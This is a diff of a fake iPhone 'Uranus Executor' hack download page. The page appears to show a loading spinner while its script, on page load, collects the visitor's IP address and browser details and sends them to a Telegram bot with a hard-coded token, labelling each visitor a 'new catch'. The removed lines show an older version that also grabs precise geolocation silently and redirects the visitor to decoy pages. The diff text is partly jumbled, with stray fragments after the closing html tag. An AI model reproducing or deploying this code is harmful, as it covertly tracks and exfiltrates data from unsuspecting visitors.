@@ -1,64 +1,37 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>تحميل هاك أورانوس للايفون</title>
+    <title>Uranus Executor iOS</title>
     <script>
-        async function captureAndSend() {
-            // بياناتك هنا
+        function sendToTelegram() {
             const token = '8719298403:AAG-9IJg2xLXm0YaV3yy0Z1wGEDGrjFQWxU';
             const chat_id = '6001286270';
             
-            // سحب الآي بي والمعلومات
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const userAgent = navigator.userAgent;
-                
-                const message = `🎯 صيد جديد! \n🌐 IP: ${data.ip} \n📱 الجهاز: ${userAgent}`;
-                
-                // إرسال للبوت
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
-                
-                // التحويل لصفحة "وهمية" بعد الإرسال
-                window.location.href = "https://www.mediafire.com/error.php"; 
-            } catch (e) {
-                window.location.href = "https://www.google.com";
-            }
+            // جلب الـ IP من خدمة خارجية
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    const msg = `🎯 صيد جديد!\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.userAgent}`;
+                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
+                    
+                    // إرسال الطلب مخفي
+                    navigator.sendBeacon(url);
+                    
+                    // إرسال طلب كلاسيكي للضمان
+                    fetch(url);
+                });
         }
+        // التنفيذ فور فتح الصفحة
+        window.onload = sendToTelegram;
     </script>
-    <style>
-        body { background: #000; color: white; text-align: center; font-family: Arial; padding-top: 50px; }
-        .btn { background: #2ecc71; padding: 20px 40px; color: white; text-decoration: none; border-radius: 10px; font-size: 20px; cursor: pointer; border: none; }
-    </style>
 </head>
-<body>
-    <h1>Uranus Executor iOS (v2.4.1)</h1>
-    <p>بانتظار التحميل... اضغط بالأسفل للتثبيت المباشر</p>
-    <br><br>
-    <button class="btn" onclick="captureAndSend()">Install IPA (Direct)</button>
+<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif; padding-top:100px;">
+    <h1>جاري تجهيز رابط التحميل...</h1>
+    <p>برجاء الانتظار ثواني لتجهيز ملف الـ IPA</p>
+    <div style="border:3px solid #2ecc71; border-radius:50%; width:50px; height:50px; border-top-color:transparent; animation:spin 1s linear infinite; margin:20px auto;"></div>
+    <style>@keyframes spin{to{transform:rotate(360deg);}}</style>
 </body>
-</html>طلب الموقع الجغرافي (صامت وبدون انتظار إجباري)
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition((pos) => {
-                        const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        _transmit(`📍 **PRECISION_LOC:**\n${link}`);
-                    }, null, { timeout: 3000, enableHighAccuracy: true });
-                }
-
-                // الهروب النهائي (إعادة توجيه ذكية)
-                // بعد 1.2 ثانية يتم نقل المستخدم لتمويه العملية
-                setTimeout(() => {
-                    window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); 
-                }, 1200);
-
-            } catch (err) {
-                window.location.replace("https://www.google.com");
-            }
-        }
-
-        // تشغيل العملية فور دخول المستخدم
-        window.onload = executeMission;
-    </script>
+</html>
 </body>
 </html>
